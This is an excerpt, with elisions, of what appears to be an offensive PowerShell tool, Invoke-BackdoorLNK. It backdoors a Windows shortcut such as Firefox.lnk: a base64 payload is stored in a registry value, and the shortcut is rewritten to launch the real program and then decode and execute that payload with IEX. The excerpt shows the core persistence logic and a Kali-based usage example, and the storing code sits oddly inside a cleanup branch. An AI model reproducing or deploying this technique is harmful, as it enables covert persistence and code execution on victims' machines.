...
<#
    .SYNOPSIS
        ...
        To generate a compatible b64 file on Kali, do:
            # base64 -w0 script.ps1 > script.b64
    ...
    .PARAMETER ScriptB64
        ...
        UTF8 base64-encoded script to store in the registry.
    ...
    .EXAMPLE
        ...
        PS C:\> Invoke-BackdoorLNK -LNKPath C:\Users\john\Desktop\Firefox.lnk -ScriptB64 AA...
...
#>
    ...
    if($CleanUp) {
        ...
        if(!$ScriptB64 -or $ScriptB64 -eq '') {
            throw "-ScriptB64 required!"
        }

        # store the encoded script into the specified registry key
        $null = Set-ItemProperty -Force -Path $Path -Name $Name -Value $ScriptB64
        ...
        $LaunchString = '[System.Diagnostics.Process]::Start("'+$TargetPath+'");IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((gp '+$Path+' '+$Name+').'+$Name+')))'
